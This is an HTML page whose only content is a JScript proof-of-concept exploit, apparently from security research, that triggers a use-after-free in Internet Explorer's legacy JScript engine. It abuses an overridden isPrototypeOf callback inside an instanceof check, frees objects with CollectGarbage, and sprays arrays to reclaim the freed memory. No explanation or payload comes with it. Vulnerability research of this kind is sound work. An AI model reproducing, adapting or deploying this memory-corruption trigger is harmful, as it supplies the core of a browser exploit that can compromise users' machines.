<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
<html>
<script language="Jscript.Encode">
function f_uaf(){
    alert("in f_uaf")
    CollectGarbage();

    for (var i = 0; i < 0x10; i+=1){
        Enum_arr[i].prototype = null;
    }
    CollectGarbage();

    for (var i = 0; i < 0x20; i+=1){
        overlapArray[i][String.fromCharCode(0x52,0x45,0x56,0x45,0x4e,0x20,0x46,0x54,0x57,0x21, 0x20, i+0x41)] = 1;
    }

    alert(this)
    return true;
}

var Enum_arr = new Array()
var a = new Array({prototype: {}})
var e = new Enumerator(a)
var eObj = e.item()
for (var i = 0; i < 0x10; i++){
    var arr = new Array({ prototype: {}});
    var e = new Enumerator(arr)
    eObj = e.item()
    eObj.prototype = new RegExp()
    eObj.prototype.isPrototypeOf = f_uaf;
    Enum_arr[i] = eObj
}
var overlapArray = Array()

for (var i = 0; i < 0x200; i++){
    overlapArray[i] = new Array();
}

var dummyObject = new Object()
dummyObject instanceof Enum_arr[0x8]
</script>
</html>